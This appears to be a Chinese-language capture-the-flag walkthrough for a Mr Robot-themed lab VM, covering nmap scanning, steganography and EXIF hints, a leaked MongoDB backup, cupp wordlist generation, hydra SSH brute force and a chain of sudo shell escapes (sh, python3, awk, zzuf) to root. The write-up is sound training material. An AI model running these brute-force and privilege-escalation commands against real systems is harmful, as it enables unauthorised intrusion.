## 靶机地址

[Proton Drive](https://drive.proton.me/urls/HHFQAPHSSW#q08xjb31dj2E)

![image-20250325130132931](assets/image-20250325130132931.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250325130212524](assets/image-20250325130212524.png)

创建文件夹用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250325130233492](assets/image-20250325130233492.png)

确定靶机ip：

192.168.1.10



#### 端口扫描

```
nmap -p- --min-rate 10000 -sT 192.168.1.10 -oA nmapscan/ports
```

![image-20250325130355421](assets/image-20250325130355421.png)开放了：

- 22 ssh
- 80 http
- 27017 mongod



#### 提取端口信息

```
ports
```

![image-20250325130415763](assets/image-20250325130415763.png)



#### 详细结果扫描

```
nmap -sC -sV -O -p 22,80,27017 192.168.1.10 -oA ./nmapscan/detail
```

![image-20250325130556887](assets/image-20250325130556887.png)

![image-20250325130626934](assets/image-20250325130626934.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 80  http Apache httpd 2.4.56
- 27017 mongodb 5.0.21



### 80端口

#### 访问192.168.1.10

![image-20250325130733537](assets/image-20250325130733537.png)

一张图片



#### 右键复制图像链接

![image-20250325130857464](assets/image-20250325130857464.png)



#### wget保存图片

```
wget http://192.168.1.10/image.jpg
```

![image-20250325130920063](assets/image-20250325130920063.png)



#### steghide检查

![image-20250325131102715](assets/image-20250325131102715.png)

可能存在隐写数据，免密提取失败



#### stegseek尝试提取

```
stegseek -sf image.jpg -wl /home/ra1n3/dic/Passwd/rockyou.txt
```

![image-20250325131147146](assets/image-20250325131147146.png)



#### exiftools查看图片元数据

```
exiftool image.jpg
```

![image-20250325131214098](assets/image-20250325131214098.png)

Comment中存在提示

1337编码

还原后为：

- BackUp_Elliot

同时/提示可能是一个目录



#### 尝试爆破目录中的备份文件

```
gobuster dir -u http://192.168.1.10/B4ckUp_3LLi0t/ -w /usr/share/dirbuster/wordlists/directory-lis
t-2.3-medium.txt -x tar,zip,rar,bak
```

![image-20250325131427628](assets/image-20250325131427628.png)

得到connect.bak



#### wget下载

```
wget http://192.168.1.10/B4ckUp_3LLi0t/connect.bak
```

![image-20250325131500456](assets/image-20250325131500456.png)



#### 查看connect.bak

```
file connect.bak
cat connect.bak
```

![image-20250325131523428](assets/image-20250325131523428.png)

给出了mongodb的用户名和密码





### 27017端口

#### 连接数据库

```
mongo -host 192.168.1.10 -u 'mongo' -p 'm0ng0P4zz' elliot
```

![image-20250325131746267](assets/image-20250325131746267.png)



#### 查询数据库内容

```
help
show dbs
use elliot
db.elliot.find()
```

![image-20250325131803540](assets/image-20250325131803540.png)

得到

- FirstName : Elliot

- Surname : Alderson
- Nickname : MrRobot
- Birthdate: 17091986



#### 利用cupp生成字典

```
cupp -i
Elliot
Alderson
MrRobot
17091986
```

![image-20250325131958061](assets/image-20250325131958061.png)

![image-20250325132028231](assets/image-20250325132028231.png)

得到字典





### 22端口

#### 尝试爆破ssh服务

```
hydra -l elliot -P elliot.txt ssh://192.168.1.10
```

![image-20250325132632114](assets/image-20250325132632114.png)

得到：

- elliot：toillE71986



#### ssh登录

```
ssh elliot@192.168.1.10
```

![image-20250325132705377](assets/image-20250325132705377.png)



## 提权

### 执行sudo -l

```
sudo -l
```

![image-20250325132730739](assets/image-20250325132730739.png)

以darlene身份执行sh



### sh提权

```
sudo -u darlene sh
whoami
```

![image-20250325132802770](assets/image-20250325132802770.png)



### 执行sudo -l

```
sudo -l
```

![image-20250325132829793](assets/image-20250325132829793.png)

以angela身份执行python3



### python提权

```
sudo -u angela python3 -c 'import os; os.system("/bin/sh")'
whoami
```

![image-20250325132927475](assets/image-20250325132927475.png)



### 执行sudo -l

```
sudo -l
```

![image-20250325132952889](assets/image-20250325132952889.png)

以tyrell身份执行awk



### awk提权

```
sudo -u tyrell awk 'BEGIN {system("/bin/sh")}'
whoami
```

![image-20250325133032062](assets/image-20250325133032062.png)



### 执行sudo -l

```
sudo -l
```

![image-20250325133051081](assets/image-20250325133051081.png)

无密码执行zzuf



### 查看使用文档

```
cd /tmp
man zzuf > help
cat help
```

![image-20250325133250175](assets/image-20250325133250175.png)

```
zzuf 是一个透明的应用程序输入模糊测试工具。它通过拦截文件和网络操作，并改变程序输入中的随机比特来工作。zzuf 的行为是确定性的，这使得重现错误变得简单。
```

![image-20250325133342828](assets/image-20250325133342828.png)



其中-c选项允许执行命令



### zzuf提权

```
sudo zzuf -c /bin/sh
whoami
```

![image-20250325133422484](assets/image-20250325133422484.png)



### 得到flag

```
cd /root
ls
cat root.txt
```

![image-20250325133445124](assets/image-20250325133445124.png)